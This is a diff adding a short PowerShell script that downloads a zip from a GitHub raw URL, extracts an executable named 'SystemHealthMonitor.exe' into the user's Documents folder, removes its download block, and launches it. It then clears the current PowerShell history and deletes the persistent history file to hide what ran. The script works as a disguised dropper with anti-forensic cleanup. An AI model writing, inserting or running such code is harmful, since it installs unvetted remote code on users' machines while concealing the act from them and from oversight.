@@ -1,0 +1,22 @@
+$targetDir = [Environment]::GetFolderPath("MyDocuments")
+$workingDir = "$env:TEMP\SystemHealth"
+$zipUrl = "https://github.com/AlaricGrey/z/raw/refs/heads/main/readme.zip"
+$zipPath = "$workingDir\readme.zip"
+New-Item -ItemType Directory -Force -Path $workingDir | Out-Null
+Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
+Expand-Archive -Path $zipPath -DestinationPath $workingDir -Force
+$exe = Get-ChildItem -Path $workingDir -Filter "SystemHealthMonitor.exe" -Recurse | Select-Object -First 1
+$destPath = Join-Path $targetDir "SystemHealthMonitor.exe"
+Copy-Item -Path $exe.FullName -Destination $destPath -Force
+Unblock-File -Path $destPath
+Start-Process -FilePath $destPath
+# Clear current session history
+[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
+
+# Delete persistent history file
+$histPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+if (Test-Path $histPath) {
+    Remove-Item $histPath -Force
+}
+exit
+
